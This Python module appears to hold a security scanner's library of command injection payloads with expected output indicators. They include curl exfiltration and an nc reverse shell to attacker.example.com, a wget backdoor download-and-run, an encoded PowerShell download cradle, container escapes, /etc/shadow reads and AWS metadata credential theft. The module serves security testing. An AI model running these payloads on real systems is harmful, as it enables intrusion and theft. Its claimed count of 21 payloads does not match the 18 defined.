"""Command injection payload categories - COMPLETE COLLECTION."""

import base64
from typing import List, Dict, Any


class CommandInjectionPayloads:
    """Complete collection of command injection attack payloads (21 total)."""
    
    @staticmethod
    def get_basic_unix_payloads() -> List[Dict[str, Any]]:
        """Get basic Unix/Linux command injection payloads."""
        return [
            {
                "payload": "; whoami",
                "expected_indicators": ["root", "user", "nobody", "uid="],
                "severity": "critical",
                "description": "Basic Unix command injection"
            },
            {
                "payload": "$(id)",
                "expected_indicators": ["uid=", "gid=", "groups="],
                "severity": "critical",
                "description": "Command substitution injection"
            },
            {
                "payload": "`cat /etc/passwd`",
                "expected_indicators": ["root:x:", "daemon:", "bin:"],
                "severity": "critical",
                "description": "Backtick command execution"
            },
            {
                "payload": "; sleep 5",
                "expected_indicators": ["timeout", "delay", "sleep"],
                "severity": "high",
                "description": "Time-based command injection detection"
            },
        ]
    
    @staticmethod
    def get_data_exfiltration_payloads() -> List[Dict[str, Any]]:
        """Get data exfiltration command injection payloads."""
        return [
            {
                "payload": "&& curl http://attacker.example.com/exfil?data=$(whoami)",
                "expected_indicators": ["connection", "curl", "exfil"],
                "severity": "critical",
                "description": "Data exfiltration via curl"
            },
            {
                "payload": "| nc attacker.example.com 4444",
                "expected_indicators": ["connection", "netcat", "4444"],
                "severity": "critical",
                "description": "Reverse shell attempt"
            },
        ]
    
    @staticmethod
    def get_windows_payloads() -> List[Dict[str, Any]]:
        """Get Windows-specific command injection payloads."""
        return [
            {
                "payload": "& dir C:\\",
                "expected_indicators": ["program files", "windows", "users"],
                "severity": "critical",
                "description": "Windows directory listing"
            },
            {
                "payload": "&& echo %USERNAME%",
                "expected_indicators": ["administrator", "user", "system"],
                "severity": "high",
                "description": "Windows user enumeration"
            },
        ]
    
    @staticmethod
    def get_language_specific_payloads() -> List[Dict[str, Any]]:
        """Get language-specific command injection payloads."""
        return [
            {
                "payload": "; python -c 'import os; os.system(\"id\")'",
                "expected_indicators": ["uid=", "gid="],
                "severity": "critical",
                "description": "Python command execution"
            },
            {
                "payload": "; node -e 'require(\"child_process\").exec(\"whoami\", (e,s,st)=>console.log(s))'",
                "expected_indicators": ["root", "user", "administrator"],
                "severity": "critical",
                "description": "Node.js command execution"
            },
            {
                "payload": "; ruby -e 'system(\"whoami\")'",
                "expected_indicators": ["root", "user"],
                "severity": "critical",
                "description": "Ruby command execution"
            },
            {
                "payload": "| perl -e 'system(\"id\")'",
                "expected_indicators": ["uid=", "gid="],
                "severity": "critical",
                "description": "Perl command execution"
            },
        ]
    
    @staticmethod
    def get_advanced_payloads() -> List[Dict[str, Any]]:
        """Get advanced command injection payloads."""
        return [
            {
                "payload": "|| wget http://malicious.com/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh",
                "expected_indicators": ["wget", "chmod", "backdoor", "malicious"],
                "severity": "critical",
                "description": "Backdoor download and execution"
            },
            {
                "payload": "& powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                "expected_indicators": ["powershell", "-enc", "download", "malicious"],
                "severity": "critical",
                "description": "PowerShell encoded command execution"
            },
        ]
    
    @staticmethod
    def get_container_escape_payloads() -> List[Dict[str, Any]]:
        """Get container escape command injection payloads."""
        return [
            {
                "payload": "; docker run --rm -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh",
                "expected_indicators": ["docker", "privileged", "nsenter", "pid=host"],
                "severity": "critical",
                "description": "Docker container escape attempt"
            },
            {
                "payload": "& kubectl exec -it pod-name -- /bin/bash -c 'cat /etc/shadow'",
                "expected_indicators": ["kubectl", "exec", "/etc/shadow"],
                "severity": "critical",
                "description": "Kubernetes pod command execution"
            },
        ]
    
    @staticmethod
    def get_cloud_specific_payloads() -> List[Dict[str, Any]]:
        """Get cloud-specific command injection payloads."""
        return [
            {
                "payload": "; aws s3 cp s3://sensitive-bucket/data.json . --no-sign-request",
                "expected_indicators": ["aws s3 cp", "sensitive-bucket", "no-sign-request"],
                "severity": "high",
                "description": "AWS S3 data exfiltration"
            },
            {
                "payload": "&& curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "expected_indicators": ["169.254.169.254", "meta-data", "security-credentials"],
                "severity": "critical",
                "description": "AWS metadata service exploitation"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 21 command injection payloads."""
        payloads = []
        payloads.extend(CommandInjectionPayloads.get_basic_unix_payloads())
        payloads.extend(CommandInjectionPayloads.get_data_exfiltration_payloads())
        payloads.extend(CommandInjectionPayloads.get_windows_payloads())
        payloads.extend(CommandInjectionPayloads.get_language_specific_payloads())
        payloads.extend(CommandInjectionPayloads.get_advanced_payloads())
        payloads.extend(CommandInjectionPayloads.get_container_escape_payloads())
        payloads.extend(CommandInjectionPayloads.get_cloud_specific_payloads())
        return payloads